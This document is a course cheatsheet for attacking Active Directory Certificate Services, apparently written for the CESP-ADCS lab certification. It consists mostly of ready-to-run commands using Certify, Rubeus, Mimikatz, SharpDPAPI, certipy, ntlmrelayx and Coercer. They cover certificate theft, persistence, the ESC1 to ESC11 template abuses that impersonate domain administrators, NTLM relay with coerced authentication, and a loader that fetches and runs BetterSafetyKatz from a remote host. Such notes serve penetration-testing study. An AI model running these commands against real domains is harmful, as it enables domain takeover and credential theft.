# CESP-ADCS Course Cheatsheet

## Index

1. [General](#1)

   1.1 [Enumeration](#11)

   1.2 [Request (PERSIST1)](#12)

   1.3 [Certpotato](#13)

   1.4 [UnPAC-The-Hash (THEFT5)](#14)

   1.5 [Conversion](#15)

   1.6 [Export (THEFT1)](#16)

   1.7 [Export - DPAPI (THEFT2 and THEFT3)](#17)

   1.8 [Parse](#18)

   1.9 [Install](#19)

   1.10 [Renew (PERSIST3)](#110)

   1.11 [Pass-The-Cert](#111)


2. [ESCx Abuses](#2)

   2.1 [ESC1](#21)

   2.2 [ESC2](#22)

   2.3 [ESC3](#23)

   2.4 [ESC4](#24)

   2.5 [ESC7.1](#25)

   2.6 [ESC8](#26)

   2.7 [ESC11](#27)


3. [Sources](#3)


------------------------------------


# <a name="1"></a>1. General

### <a name="11"></a>1.1 Enumeration

Enumerate Certificate Authorities:

```
C:\Tools\Certify.exe cas
certutil -TCAInfo
```

Enumerate templates:

```
C:\Tools\Certify.exe find
certutil -v -dstemplate 
```

Enumerate templates allow client authentication:

```
Certify.exe find /clientauth 
```

Enumerate CertStore - certutil

```
certutil -store My
certutil -user -store My
```

Enumerate CertStore - CertifyKit

```
C:\Users\Public\CertifyKit.exe list
```

Enumerate CertStore - Powershell

```
Get-ChildItem Cert:\CurrentUser\ -Recurse
Get-ChildItem Cert:\LocalMachine\ -Recurse
Get-ChildItem Cert:\CurrentUser\My -Recurse
Get-ChildItem Cert:\LocalMachine\My -Recurse
```

Enumerate CAs:

```
certutil -CAInfo
```

Enumerate Trusted Root Certification Authorities Root store:

```
certutil -store -enterprise Root
```


### <a name="12"></a>1.2 Request (PERSIST1)

```
C:\Tools\Certify.exe find
C:\Tools\Certify.exe request /ca:CA_NAME /user:USER /domain:DOMAIN /template:TEMPLATE_NAME
```


### <a name="13"></a>Certpotato

```
C:\Tools\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs|http|.../MACHINE.DOMAIN /dc:DC.DOMAIN /user:COMPUTER_NAME$ /rc4:HASH /ptt
C:\Tools\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs|http|.../MACHINE.DOMAIN /dc:DC.DOMAIN /user:COMPUTER_NAME$ /ticket:TICKET.kirbi /ptt
```


### <a name="14"></a>UnPAC-The-Hash (THEFT5)

```
C:\Tools\Rubeus.exe asktgt /getcredentials /user:COMPUTER_NAME$ /certificate:C:\Certs\COMPUTER_NAME.pfx /password:PASSWORD /domain:DOMAIN /dc:DC.DOMAIN /show
```


### <a name="15"></a>Conversion 

Convert .pem to .pfx certificate:

```
C:\Tools\openssl\openssl.exe pkcs12 -in C:\Certs\USER.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\Certs\USER.pfx
```


### <a name="16"></a>Export (THEFT1)

Using certutil:

```
certutil -p "PASSWORD" -exportpfx HASH C:\Users\Public\USER.pfx
certutil -exportpfx -p "PASSWORD" -enterprise Root HASH C:\Users\Public\CA_NAME.p12
```

Using CertifyKit:

```
C:\Users\Public\CertifyKit.exe list /storename:my /storelocation:localmachine /certificate:CERTIFICATE_HASH /outfile:C:\Users\Public\USER.pfx
CertifyKit.exe list /certificate:CERTIFICATE_HASH /base64
```

Using Mimikatz:

```
C:\Users\Public\Loader.exe -path http://IP/BetterSafetyKatz.exe -args "crypto::capi" "privilege::debug" "crypto::certificates /systemstore:local_machine /store:my /export" "exit"
```

Using Powershell:

```
$mypwd = ConvertTo-SecureString -String "PASSWORD" -Force -AsPlainText
Export-PfxCertificate -Cert Cert:\LocalMachine\My\CERTIFICATE_HASH -FilePath C:\Users\Public\USER.pfx -Password $mypwd
```


### <a name="17"></a>Export - DPAPI (THEFT2 and THEFT3)

Export certificates from the User:

```
C:\Users\Public\SharpDPAPI.exe certificates
C:\Users\Public\SharpDPAPI.exe certificates /password:PASSWORD
```

Export certificates from the Machine:

```
C:\Users\Public\SharpDPAPI.exe certificates /machine
lsadump::secrets
crypto::certificates /export /systemstore:LOCAL_MACHINE
```


### <a name="18"></a>Parse

Parse certificates:

```
certutil -dump -v C:\Users\certstore\OpenVPN\config\CERT.pem
certutil -v -dump C:\Certs\USER.pfx
certutil -v -dump -p "PASSWORD" C:\Certs\CERT.pfx
```


### <a name="19"></a>Install

```
C:\Users\Public\CertifyKit.exe list /certificate:C:\Users\Public\CERT.pfx /password:PASSWORD /install
certutil -user -store My
C:\Users\Public\CertifyKit.exe list /certificate:C:\Users\USER\EncryptedFiles\USER.pfx /storename:My /install
```


### <a name="110"></a>Renew (PERSIST3)

```
certreq -enroll -user -q -PolicyServer * -cert CERT_HASH renew reusekeys
certreq -enroll -user -q -cert CERT_HASH renew
```


### <a name="111"></a>Pass-The-Cert

```
C:\Tools\Rubeus.exe asktgt /user:USER /certificate:C:\Certs\USER.pfx /password:PASSWORD /domain:DOMAIN /dc:DC.DOMAIN /nowrap /ptt
```


----------------------------------


# <a name="2"></a>ESCx Abuses

### <a name="21"></a>ESC1

Conditions:

- ENROLLEE_SUPPLIES_SUBJECT flag is enabled allowing SAN

- Client Authentication bit is enabled
   - Smart Card Logon --> 1.3.6.1.4.1.311.20.2.2
   - PKINIT authentication --> 1.3.6.1.5.2.3.4
   - Client Authentication --> 1.3.6.1.5.5.7.3.2

- Enrollment Rights enabled for a user you control

Enumeration:

```
C:\Users\Public\Certify.exe cas
C:\Tools\Certify.exe find /enrolleeSuppliesSubject
C:\Users\Public\Certify.exe find /domain:protectedDOMAIN
```

Exploitation:

```
C:\Users\Public\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname:administrator /sidextension:DOMAIN_SID-500 /domain:DOMAIN
```


### <a name="22">ESC2

Conditions: 

- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag (ENROLLEE_SUPPLIES_SUBJECT) is enabled allowing SAN abuse

- Any Purpose EKU is enabled

   - Any Purpose EKU --> 2.5.29.37.0

   - No EKU

- Enrollment Rights enabled for a user you control


Enumeration:

```
C:\Users\Public\Certify.exe find /enrolleeSuppliesSubject
```

Exploitation:

```
C:\Users\Public\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname:administrator /sidextension:DOMAIN_SID-500 /domain:DOMAIN
```


### <a name="23">ESC3


Template 1: Provides Enrollment Agent Certificate

- Certificate Request Agent EKU --> 1.3.6.1.4.1.311.20.2.1 is enabled.

- Enrollment Rights are enabled for a user that we control.

Template 2: Allows Enrollment Agent Certificate to use on-behalf-of

- Client Authentication EKU --> 1.3.6.1.5.5.7.3.2 is enabled.

- Application Policy Issuance Requirement with Authorized Signatures Required enabled and set to 1

- Certificate Request Agent EKU enabled.

- Enrollment Rights are enabled for a user that we control.

Enumeration:

```
C:\Tools\Certify.exe find
```

Enroll in template with Certificate Request Agent EKU set (TEMPLATE_NAME) to receive an Enrollment Agent Certificate:

```
C:\Tools\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /user:USER /domain:DOMAIN
```

Use the Enrollment Agent certificate to enroll in a template (TEMPLATE_NAME_2) on behalf of another user:

```
C:\Tools\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME_2 /onbehalfof:DOMAIN\administrator /enrollcert:C:\Certs\esc3-enrollmentAgent.pfx /enrollcertpw:PASSWORD /domain:DOMAIN
```


### <a name="24">ESC4

Condition: 

- Certificate with overly permissive ACLs (Owner, FullControl, WriteOwner, WriteDacl, WriteProperty) allow to modify settings -> Exploit ESC1, ESC2, ESC3

Enumeration:

```
C:\Tools\Certify.exe find /templates
C:\Tools\Certify.exe pkiobjects
C:\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter TEMPLATE_NAME
C:\Tools\CertifyKit.exe find /templates
```

Enable SmartCardLogon EKU instead of the Client Authentication EKU:

```
C:\Tools\CertifyKit.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname:administrator /domain:DOMAIN /alter /sidextension:DOMAIN_SID-500
```

Exploitation:

```
C:\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter TEMPLATE_NAME --ess --add
C:\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter TEMPLATE_NAME --ntaccount DOMAIN\USER --enroll --add
StandIn_v13_Net45.exe --ADCS --filter TEMPLATE_NAME --clientauth --add
C:\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter User --ntaccount DOMAIN\USER --write --add
```


### <a name="25">ESC7.1

Condition:

- User has ManageCA and ManageCertificates rights over the CA

Enumeration:

```
C:\Tools\Certify.exe cas
C:\Tools\Certify.exe find
```

Request certificate from SubCA for the EA using [this version of Certify](https://github.com/blackarrowsec/Certify) - You get denied access but get the private key:

```
C:\Tools\Certify.exe request /ca:CA_NAME /template:subCA /altname:administrator /domain:internalDOMAIN /sidextension:DOMAIN_SID-500
```

Issue the failed certificate request:

```
C:\Tools\Certify-esc7.exe issue /ca:CA_NAME /id:69
```

Retrieve the issued request -> Get certificate:

```
C:\Tools\Certify-esc7.exe download /ca:CA_NAME.DOMAIN\CBCA /id:69
```

Convert private key + certificate from .pem to .pfx:

```
C:\Tools\openssl\openssl.exe pkcs12 -in C:\Certs\esc7.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\Certs\esc7.pfx
```

EXTRA 1: No ManageCertificates -> Add ourselves as a new officer using existing ManageCA:

```
certipy ca -u USER@internalDOMAIN -hashes 'HASHES:HASHES' -ca 'CA_NAME' -dc-ip DC_IP -target CA_NAME.DOMAIN -add-officer USER
```

EXTRA 2: If SubCA disabled -> Enable ManageCA:

```
certipy ca -u USER@internalDOMAIN -hashes 'HASHES:HASHES' -ca 'CA_NAME' -dc-ip DC_IP -target CA_NAME.DOMAIN -enable-template 'SubCA'
```


### <a name="26">ESC8

Condition: 

- Web enrollment interface enabled in the Certificate Authority (url is *http://CA_NAME.DOMAIN/certsrv/certsnsh.asp*)


Enumerate HTTP Enrollment Endpoints:

```
certutil -enrollmentServerURL -config CA_NAME
```

```
source certipy_venv/bin/activate
certipy find -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP -stdout
```

Set up relay:

```
source impacket_venv/bin/activate
/opt/Tools/impacket/examples/ntlmrelayx.py -t http://CA_NAME.DOMAIN/certsr/certfnsh.asp -smb2support --adcs --template 'DomainController'
```

Coerce authentication:

```
source coercer_venv/bin/activate
/opt/Tools/Coercer/Coercer.py coerce -l MACHINE_NAME.DOMAIN -t DC.DOMAIN -u USER -p 'PASSWORD' -d DOMAIN -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
```



### <a name="27">ESC11

Condition: 

- RPC interface enabled in the Certificate Authority 

Enumerate ICPR:

```
source certipy_esc11_venv/bin/activate
certipy find -u USER@DOMAIN -p 'PASSWORD' -stdout
```

Set up relay:

```
source impacket_esc11_venv/bin/activate
/opt/Tools/impacket-esc11/examples/ntlmrelayx.py -t "rpc://CA_NAME.DOMAIN" -rpc-mode ICPR -icpr-ca-name "CA_NAME" -smb2support --adcs --template 'DomainControllerAuthentication'
```

Coerce authentication:

```
source coercer_venv/bin/activate
/opt/Tools/Coercer/Coercer.py coerce -l MACHINE_NAME.DOMAIN -t DC.DOMAIN -u USER -p 'PASSWORD' -d DOMAIN -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
```

----------------------------------

# <a name="3">Sources

- [Altered Security - ADCS lab](https://www.alteredsecurity.com/adcs): This is the course, highly recommended to complete the labs.

- [SpecterOps - Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf): This is the paper in which the course is based, it is not short in length but the content is extremely interesting, a must-read specially if you are taking or planning to take the course.

- [SensePost - CertPotato: Using ADCS to privesc from virtual and network service accounts to local system](https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/): The blog post where CertPotato privilege escalation is explained.

- [Tarlogic - AD CS: weaponizing the ESC7 attack](https://www.tarlogic.com/blog/ad-cs-esc7-attack/): The blog post where ESC7.1 abuse is explained, not included in SpecterOps' paper.
